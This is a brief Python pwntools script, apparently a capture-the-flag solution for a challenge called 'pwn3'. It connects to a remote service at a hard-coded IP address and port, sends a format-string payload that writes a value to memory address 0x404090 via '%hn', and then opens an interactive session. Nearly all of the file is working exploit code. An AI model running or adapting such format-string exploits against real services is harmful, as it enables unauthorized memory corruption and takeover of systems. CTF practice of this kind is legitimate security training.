from pwn import *

# elf = ELF("./pwn3")
# p = elf.process()
p = remote("159.223.44.154", 13339)

# gdb.attach(p, 'br *main')
payload = b"%4880c%8$hnaaaaa" + p64(0x404090)
p.sendline(payload)
p.interactive()
